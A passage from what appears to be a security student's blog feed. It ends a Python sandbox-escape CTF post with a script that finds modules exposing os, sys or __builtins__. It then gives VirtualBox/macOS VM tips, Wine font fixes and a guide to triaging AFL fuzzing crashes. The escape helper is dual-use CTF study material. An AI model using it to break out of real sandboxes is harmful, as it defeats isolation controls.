<span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;pkg_resources&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;_random&#x27;</span>, <span class="string">&#x27;distro_info&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;ufw&#x27;</span>, <span class="string">&#x27;_sha1&#x27;</span>, <span class="string">&#x27;distro_info_test&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;unicodedata&#x27;</span>, <span class="string">&#x27;_sha256&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;_sha3&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;_sha512&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;urllib3&#x27;</span>, <span class="string">&#x27;_signal&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;usbcreator&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;problem_report&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;_socket&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;_sqlite3&#x27;</span>, <span class="string">&#x27;errno&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;_sre&#x27;</span>, <span class="string">&#x27;faulthandler&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;wadllib&#x27;</span>, <span class="string">&#x27;_ssl&#x27;</span>, <span class="string">&#x27;fcntl&#x27;</span>, <span class="string">&#x27;ptyprocess&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;_stat&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;_string&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;pyatspi&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;_struct&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;_symtable&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;xdg&#x27;</span>, <span class="string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;_testbuffer&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;pyexpat&#x27;</span>, <span class="string">&#x27;xkit&#x27;</span>, <span class="string">&#x27;_testcapi&#x27;</span>, <span class="string">&#x27;gc&#x27;</span>, <span class="string">&#x27;pygtkcompat&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;_testimportmultiple&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;pymacaroons&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;_testmultiphase&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;pyrfc3339&#x27;</span>, <span class="string">&#x27;xxlimited&#x27;</span>, <span class="string">&#x27;_thread&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;pytz&#x27;</span>, <span class="string">&#x27;xxsubtype&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;yaml&#x27;</span>, <span class="string">&#x27;_tracemalloc&#x27;</span>, <span class="string">&#x27;gi&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;gtweak&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>, <span class="string">&#x27;_yaml&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;reportlab&#x27;</span>, <span class="string">&#x27;zope&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line">results = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> all_modules_3:</span><br><span class="line">    results[module] = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;result&#x27;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = <span class="built_in">__import__</span>(module)</span><br><span class="line">        attrs = <span class="built_in">dir</span>(m)</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs:</span><br><span class="line">                result = <span class="string">&#x27;yes&#x27;</span></span><br><span class="line">                results[module][<span class="string">&#x27;flag&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">&#x27;no&#x27;</span></span><br><span class="line"></span><br><span class="line">            results[module][<span class="string">&#x27;result&#x27;</span>][method] = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="keyword">if</span> results[result][<span class="string">&#x27;flag&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + result)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> results[result][<span class="string">&#x27;result&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  [-]&#x27;</span> + r + <span class="string">&#x27;: &#x27;</span> + results[result][<span class="string">&#x27;result&#x27;</span>][r])</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>sandbox-escape</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox Tips</title>
    <url>/2020/02/13/2020-02-13-Virtual-Box-Tips/</url>
    <content><![CDATA[<p>Here are some tips for virtual box.</p>
<h2 id="Minimize-VirtualBox’s-VM-Space"><a href="#Minimize-VirtualBox’s-VM-Space" class="headerlink" title="Minimize VirtualBox’s VM Space"></a>Minimize VirtualBox’s VM Space</h2><h3 id="Defrag"><a href="#Defrag" class="headerlink" title="Defrag"></a>Defrag</h3><p>Linux guest machine:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo dd <span class="keyword">if</span>=/dev/zero of=/EMPTY bs=1M</span><br><span class="line">$ sudo rm -f /EMPTY</span><br></pre></td></tr></table></figure>
<p>Windows guest os (using Sysinternals Suite):</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sdelete –z c: % or other drive %</span><br></pre></td></tr></table></figure>
<h3 id="Compress-Disk"><a href="#Compress-Disk" class="headerlink" title="Compress Disk"></a>Compress Disk</h3><p>for VDI file:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ VBoxManage modifyhd xxx.vdi --compact</span><br></pre></td></tr></table></figure>

<p>but for Vmware’s VMDK file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ VBoxManage clonehd &quot;source.vmdk&quot; &quot;cloned.vdi&quot; --format vdi</span><br><span class="line">$ VBoxManage modifyhd cloned.vdi --compact</span><br><span class="line">$ VBoxManage clonehd &quot;cloned.vdi&quot; &quot;compressed.vmdk&quot; --format vmdk</span><br><span class="line"># after transforming vmdk to vdi, you will find size reduced largely</span><br><span class="line"># so you can neglect step 2</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmware-vdiskmanager -k disk.vmdk</span><br></pre></td></tr></table></figure>

<h2 id="Install-MacOS-Virtual-Machine"><a href="#Install-MacOS-Virtual-Machine" class="headerlink" title="Install MacOS Virtual Machine"></a>Install MacOS Virtual Machine</h2><p>See <a class="link"   href="https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/" >Here<i class="fas fa-external-link-alt"></i></a> to  get the complete process of operation.</p>
<p>Download the ISO image of macOS first.<br>Contact me if you want ISO of macOS High Sierra.</p>
<h3 id="Create-a-Machine"><a href="#Create-a-Machine" class="headerlink" title="Create a Machine"></a>Create a Machine</h3><p>Create a new macOS virtual machine, which is supported in VirtualBox by default.</p>
<p><img src="/imghost/vbt/1.png" alt="even supports mojave"></p>
<p>Bigger video memory, more processor cores and larger storage are needed. </p>
<p><img src="/imghost/vbt/2.png" alt="larger is better"></p>
<h3 id="After-the-Creation"><a href="#After-the-Creation" class="headerlink" title="After the Creation"></a>After the Creation</h3><p>After creating virtual disk, run VBoxManage commands before booting macOS virtual machine</p>
<p>High Sierra:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#x27;macOS&#x27; is your vm&#x27;s name</span></span><br><span class="line"><span class="comment"># use VBoxManage.exe on Windows</span></span><br><span class="line">$ VBoxManage.exe modifyvm <span class="string">&quot;macOS&quot;</span> --cpuidset 00000001 000306a9 04100800 7fbae3ff bfebfbff</span><br><span class="line">$ VBoxManage setextradata <span class="string">&quot;macOS&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot;</span> <span class="string">&quot;MacBookPro11,3&quot;</span></span><br><span class="line">$ VBoxManage setextradata <span class="string">&quot;macOS&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot;</span> <span class="string">&quot;1.0&quot;</span></span><br><span class="line">$ VBoxManage setextradata <span class="string">&quot;macOS&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot;</span> <span class="string">&quot;Mac-2BD1B31983FE1663&quot;</span></span><br><span class="line">$ VBoxManage setextradata <span class="string">&quot;macOS&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot;</span> <span class="string">&quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;</span></span><br><span class="line">$ VBoxManage setextradata <span class="string">&quot;macOS&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot;</span> 1</span><br></pre></td></tr></table></figure>
<p>Mojave:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ VBoxManage modifyvm macOS --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff</span><br><span class="line">$ VBoxManage setextradata macOS <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot;</span> <span class="string">&quot;iMac11,3&quot;</span></span><br><span class="line">$ VBoxManage setextradata macOS <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot;</span> <span class="string">&quot;1.0&quot;</span></span><br><span class="line">$ VBoxManage setextradata macOS <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot;</span> <span class="string">&quot;Iloveapple&quot;</span></span><br><span class="line">$ VBoxManage setextradata macOS <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot;</span> <span class="string">&quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;</span></span><br><span class="line">$ VBoxManage setextradata macOS <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot;</span> 1</span><br></pre></td></tr></table></figure>
<h3 id="Resolution-Configuration"><a href="#Resolution-Configuration" class="headerlink" title="Resolution Configuration"></a>Resolution Configuration</h3><p>When booting up, you will find the resolution not fitting.</p>
<p>Configure resolution:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ VBoxManage setextradata macOS CustomVideoMode1 1366x768x32</span><br><span class="line">$ VBoxManage setextradata macOS VBoxInternal2/EfiGraphicsResolution 1366x768</span><br><span class="line"></span><br><span class="line">$ VBoxManage setextradata macOS VBoxInternal2/EfiHorizontalResolution 1366</span><br><span class="line">$ VBoxManage setextradata macOS VBoxInternal2/EfiVerticalResolution 768</span><br></pre></td></tr></table></figure>
<p>More in <a class="link"   href="https://www.wikigain.com/fix-virtualbox-macos-high-sierra-screen-resolution-1920x1080-4k-5k/" >Fix VirtualBox macOS High Sierra Screen Resolution (1920×1080 – 4K – 5K)<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://www.wikigain.com/fix-macos-sierra-screen-resolution-virtualbox/" >How to Fix macOS Sierra Screen Resolution on VirtualBox?<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><p>In Mac OS some <code>root</code> users are still limited to do some operations. Reboot to enter <code>recovery</code> mode (command + r) and:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ csrutil <span class="built_in">disable</span>   <span class="comment"># `csrutil enable` to recovery</span></span><br></pre></td></tr></table></figure>
<p>to let users edit some key files.</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>virtualbox</tag>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Wine Tips</title>
    <url>/2020/02/18/2020-02-18-Wine-Tips/</url>
    <content><![CDATA[<p>Tips for dealing wine font or encoding problems.</p>
<h2 id="Solve-Garbled-Text"><a href="#Solve-Garbled-Text" class="headerlink" title="Solve Garbled Text"></a>Solve Garbled Text</h2><h3 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h3><p>After installation of Wine, the execution and configuration interfaces may be garbled.<br>You need to add the missing fonts.</p>
<p>Copy all font files under <code>C:/WINDOWS/Fonts/</code> on windows to <code>/usr/share/wine/fonts/</code> on Linux, then this can be solved. Get a copy to <code>/usr/share/fonts/</code> if it doesn’t work, and:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo mkfontscale <span class="comment"># generate fonts info</span></span><br><span class="line">$ sudo mkfontdir <span class="comment"># generate fonts directory</span></span><br><span class="line">$ sudo fc-cache -fv <span class="comment"># refresh system fonts cache</span></span><br></pre></td></tr></table></figure>
<h3 id="Software"><a href="#Software" class="headerlink" title="Software"></a>Software</h3><p>If the software you run appears grabled text, you also need to copy windows fonts, to <code>~/.wine/drive_c/windows</code>.</p>
<p>Create a file named <code>xxx.reg</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REGEDIT4</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontSubstitutes]</span><br><span class="line">&quot;Arial&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Arial CE,238&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Arial CYR,204&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Arial Greek,161&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Arial TUR,162&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Courier New&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Courier New CE,238&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Courier New CYR,204&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Courier New Greek,161&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Courier New TUR,162&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;FixedSys&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Helv&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Helvetica&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;MS Sans Serif&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;MS Shell Dlg&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;MS Shell Dlg 2&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;System&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Tahoma&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Times&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Times New Roman CE,238&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Times New Roman CYR,204&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Times New Roman Greek,161&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Times New Roman TUR,162&quot;=&quot;simsun&quot;</span><br><span class="line">&quot;Tms Rmn&quot;=&quot;simsun&quot;</span><br></pre></td></tr></table></figure>
<p>Then run </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ regedit xxx.reg <span class="comment"># or &#x27;wine regedit xxx.reg&#x27;</span></span><br></pre></td></tr></table></figure>
<p>It’s from blog of others and I didn’t get text rightly displayed, so I tried this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REGEDIT4</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontLink\SystemLink]</span><br><span class="line">&quot;Lucida Sans Unicode&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;Microsoft Sans Serif&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;MS Sans Serif&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;Tahoma&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;Tahoma Bold&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;SimSun&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;Arial&quot;=&quot;wqy-microhei.ttc&quot;</span><br><span class="line">&quot;Arial Black&quot;=&quot;wqy-microhei.ttc&quot;</span><br></pre></td></tr></table></figure>
<p>Succeeded. The edition of registry font link works well.</p>
<h2 id="Winecfg"><a href="#Winecfg" class="headerlink" title="Winecfg"></a>Winecfg</h2><p>Later…</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>Analyse AFL Fuzzing Result</title>
    <url>/2020/02/16/2020-02-16-Analyse-AFL-Fuzzing-Result/</url>
    <content><![CDATA[<p>After doing fuzzing, we concentrate on result analysis.</p>
<h2 id="Check-Fuzzer-Status"><a href="#Check-Fuzzer-Status" class="headerlink" title="Check Fuzzer Status"></a>Check Fuzzer Status</h2><h3 id="afl-whatsup"><a href="#afl-whatsup" class="headerlink" title="afl-whatsup"></a>afl-whatsup</h3><p>It helps showing the running status and overall running overview of each fuzzer, where the data is the sum of all fuzzers.<br>Plus the -s option to display only the overview.</p>
<p>Use:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-whatsup -s syncdir</span><br></pre></td></tr></table></figure>
<p>To see:<br><img src="/imghost/aafr/1.jpg" alt="afl-whatsup e.g."></p>
<p>It’s real time status without auto refreshing.<br>People always give it a loop to have updating feedback.</p>
<h3 id="afl-gotcpu"><a href="#afl-gotcpu" class="headerlink" title="afl-gotcpu"></a>afl-gotcpu</h3><p>It helps checking status of every core.</p>
<p><img src="/imghost/aafr/2.jpg" alt="afl-gotcpu e.g."></p>
<h3 id="afl-stat"><a href="#afl-stat" class="headerlink" title="afl-stat"></a>afl-stat</h3><p>It is one of <a class="link"   href="https://gitlab.com/rc0r/afl-utils" >afl-utils<i class="fas fa-external-link-alt"></i></a>, the AFL auxiliary tools .This tool is similar to the output of afl-whatsup.</p>
<p>Before using it, you need a configuration file to set the output directory of each afl-fuzz instance:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># set file name as afl-stats.conf</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;fuzz_dirs&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;/root/syncdir/SESSION000&quot;</span>,</span><br><span class="line">      <span class="string">&quot;/root/syncdir/SESSION001&quot;</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&quot;/root/syncdir/SESSION00x&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Then specify the configuration file to run:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-stats -c afl-stats.conf</span><br><span class="line"></span><br><span class="line">[SESSION000 on fuzzer1]</span><br><span class="line">Alive:   1/1</span><br><span class="line">Execs:   64 m</span><br><span class="line">Speed:   0.3 x/s</span><br><span class="line">Pend:    6588/249</span><br><span class="line">Crashes: 101</span><br><span class="line">[SESSION001 on fuzzer1]</span><br><span class="line">Alive:   1/1</span><br><span class="line">Execs:   105 m</span><br><span class="line">Speed:   576.6 x/s</span><br><span class="line">Pend:    417/0</span><br><span class="line">Crashes: 291</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="afl-plot"><a href="#afl-plot" class="headerlink" title="afl-plot"></a>afl-plot</h3><p>Besides command line utils, we have <code>afl-plot</code> to produce (plot) more intuitive results.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install dependency -- gnuplot</span></span><br><span class="line">$ apt install gnuplot</span><br><span class="line">$ afl-plot afl_state_dir graph_output_dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># see outputs</span></span><br><span class="line">$ <span class="built_in">cd</span> graph_output_dir</span><br><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── exec_speed.png</span><br><span class="line">├── high_freq.png</span><br><span class="line">├── index.html</span><br><span class="line">└── low_freq.png</span><br><span class="line"></span><br><span class="line">0 directories, 4 files</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Click index.html to see graphs.</p>
<h2 id="When-to-Stop"><a href="#When-to-Stop" class="headerlink" title="When to Stop"></a>When to Stop</h2><p>Normally you should wait as long as you can, until fuzzer get 100% coverage, but it’s hard to judge.</p>
<p>Look at upper right corner of AFL running panel, you see overall results<br><img src="/imghost/aafr/3.jpg" alt="upper right corner"><br>With cycles num increasing, it’s color turns from red to yellow, bule and eventually green.<br>Green means useless to do further fuzzing. </p>
<p>There’re some AFL extensions like <code>pythia</code>.<br>It shows status and give estimates of crash and path.<br><img src="/imghost/aafr/4.jpg" alt="pythia 1"></p>
<ul>
<li>correctness: probability of finding a crash leading input.</li>
<li>fuzzability: difficulty of finding a new path. The higher, the easier to fuzz.</li>
<li>current paths: the number of paths.<br>currently found.</li>
<li>path coverag: path coverage.</li>
</ul>
<p>Once you have waited for several days,<br><img src="/imghost/aafr/5.jpg" alt="pythia 2"><br>or the path coverage reaches 99%, or correctness decreases to 1e-08, stop the fuzz.</p>
<h2 id="Output-Result"><a href="#Output-Result" class="headerlink" title="Output Result"></a>Output Result</h2><p>Contents of multi-fuzzer instance sync dirs</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ tree -L 3</span><br><span class="line">.</span><br><span class="line">├── fuzzer1</span><br><span class="line">│   ├── crashes</span><br><span class="line">│   │   ├── id:000000,sig:06,src:000019+000074,op:splice,rep:2</span><br><span class="line">│   │   ├── ...</span><br><span class="line">│   │   ├── id:000002,sig:06,src:000038+000125,op:splice,rep:4</span><br><span class="line">│   │   └── README.txt</span><br><span class="line">│   ├── fuzz_bitmap</span><br><span class="line">│   ├── fuzzer_stats</span><br><span class="line">│   ├── hangs</span><br><span class="line">│   │   └── id:000000,src:000007,op:flip1,pos:55595</span><br><span class="line">│   ├── plot_data</span><br><span class="line">│   └── queue</span><br><span class="line">│       ├── id:000000,orig:1.png</span><br><span class="line">│       ├── ....</span><br><span class="line">│       └── id:000101,sync:fuzzer10,src:000102</span><br><span class="line">└── fuzzer2</span><br><span class="line">        ├── crashes</span><br><span class="line">        ├── ...</span><br></pre></td></tr></table></figure>
<ul>
<li>queue: stores all testcases with special executive paths.</li>
<li>crashes: stores cases causing target to receive fatal signal and crash.</li>
<li>crashes&#x2F;README.txt： saves command parameters to execute crash cases.</li>
<li>hangs： cases leading to target timeout.</li>
<li>fuzzer_stats： afl-fuzz status.</li>
<li>plot_data： for afl-plot to plot.</li>
</ul>
<h2 id="Process-Result"><a href="#Process-Result" class="headerlink" title="Process Result"></a>Process Result</h2><h3 id="Crash-Exploration-Mode"><a href="#Crash-Exploration-Mode" class="headerlink" title="Crash Exploration Mode"></a>Crash Exploration Mode</h3><p>Also called <code>peruvian rabbit mode</code>, making sure the bug is exploitable.</p>
<p>Use <code>-C</code> parameter to turn on <code>crash exploration mode</code>, one crash case as input, afl-fuzz will produce related but different crashes.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-fuzz -m none -C -i poc -o peruvian-were-rabbit_out -- /path/to/target @@ </span><br></pre></td></tr></table></figure>
<p>In this way, length of memory address can be messured, and buffer may be detected.</p>
<h3 id="triage-crashes"><a href="#triage-crashes" class="headerlink" title="triage_crashes"></a>triage_crashes</h3><p>This is a script in AFL source code dir :<br><code>afl-2.52b/experimental/crash_triage/triage_crashes.sh</code><br>which helps trigger collected crashes.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./triage_crashes.sh /path/to/afl_output_dir /path/to/tested_binary [...target params...]</span><br><span class="line"></span><br><span class="line">  +++ ID 000000, SIGNAL 11 +++</span><br><span class="line">  +++ ID 000001, SIGNAL 06 +++</span><br><span class="line">  +++ ID 000002, SIGNAL 06 +++</span><br><span class="line">  +++ ID 000003, SIGNAL 06 +++</span><br><span class="line">  +++ ID 000004, SIGNAL 11 +++</span><br><span class="line">  +++ ID 000005, SIGNAL 11 +++</span><br><span class="line">  +++ ID 000006, SIGNAL 11 +++</span><br></pre></td></tr></table></figure>
<p>Different SIGNAL means different signals.<br>For example, 11 means SIGSEGV (indicates buffer overflow), 06 means SIGABRT (indicates double free) …<br><a class="link"   href="https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf" >Linux signal list<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://linux.die.net/man/7/signal" >signal(7) man page<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="crashwalk"><a href="#crashwalk" class="headerlink" title="crashwalk"></a>crashwalk</h3><p><code>crashwalk</code> gets you more detailed crashes classification results, and the specific causes of crashes.<br>It is based on <code>exploitable</code> plugin of gdb, install on ubuntu:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install gdb golang</span><br><span class="line">$ mkdir ~/tools</span><br><span class="line">$ <span class="built_in">cd</span> ~/tools</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/jfoote/exploitable.git</span><br><span class="line">$ mkdir go</span><br><span class="line">$ <span class="built_in">export</span> GOPATH=~/tools/go</span><br><span class="line">$ <span class="built_in">export</span> CW_EXPLOITABLE=~/tools/exploitable/exploitable/exploitable.py</span><br><span class="line">$ go get -u -v github.com/bnagy/crashwalk/cmd/...</span><br></pre></td></tr></table></figure>
<p>Follow the lead, use correct path. You will find three binary files in $GOPATH.</p>
<p><code>crashwalk</code> has <code>Manual Mode</code> and <code>AFL Mode</code>.<br><code>Manual Mode</code> reads crashes&#x2F;README.txt to get command.<br><code>AFL Mode</code> set parameters manually.</p>
